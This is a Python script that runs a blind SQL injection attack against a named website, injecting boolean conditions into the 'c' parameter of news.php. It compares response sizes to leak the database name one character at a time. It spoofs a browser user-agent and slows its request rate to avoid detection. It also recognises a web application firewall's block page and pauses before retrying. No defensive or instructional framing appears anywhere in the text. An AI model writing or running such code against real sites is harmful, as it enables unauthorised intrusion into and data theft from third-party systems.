#!/usr/bin/env python3
"""zagroup numeric blind - ULTRA SLOW (5s), single sample, 41B oracle
Strategy: 1 request per char test, 5s sleep, threshold = true_med - 10
"""
import urllib.request, urllib.parse, string, time, sys

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        body = r.read()
        blocked = b"\xe4\xba\x91\xe7\xbd\x91\xe7\x9b\xbe" in body
        return r.status, len(body), blocked
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000)), False
    except Exception:
        return 0, 0, False

def get_sz(expr):
    payload = "259%20aNd%20(" + urllib.parse.quote(expr) + ")"
    code, sz, blocked = fetch(BASE + "?c=" + payload)
    time.sleep(5)
    return sz, blocked

# calibrate fresh (2 samples each)
print("[*] calibrate", flush=True)
t_vals, f_vals = [], []
for _ in range(2):
    s, b = get_sz("select 1=1")
    if not b: t_vals.append(s)
    s, b = get_sz("select 1=2")
    if not b: f_vals.append(s)
if not t_vals or not f_vals:
    print("BLOCKED", flush=True)
    sys.exit(1)
t = sum(t_vals)//len(t_vals)
f = sum(f_vals)//len(f_vals)
print("true=%s avg=%d false=%s avg=%d diff=%d" % (t_vals, t, f_vals, f, t - f), flush=True)
# threshold: between true and false
threshold = (t + f) / 2

def is_true(expr):
    s, b = get_sz(expr)
    if b:
        print("  blocked %s, wait 60s" % s, flush=True)
        time.sleep(60)
        s, b = get_sz(expr)
    return s > threshold

db = ""
for pos in range(1, 12):
    found = False
    for c in CHARS:
        expr = "select substr(database(),%d,1)='%s'" % (pos, c)
        if is_true(expr):
            db += c
            print("pos%d=%s -> %s" % (pos, c, db), flush=True)
            found = True
            break
    if not found:
        db += "?"
        print("pos%d=? -> %s" % (pos, db), flush=True)
print("DATABASE:", db, flush=True)
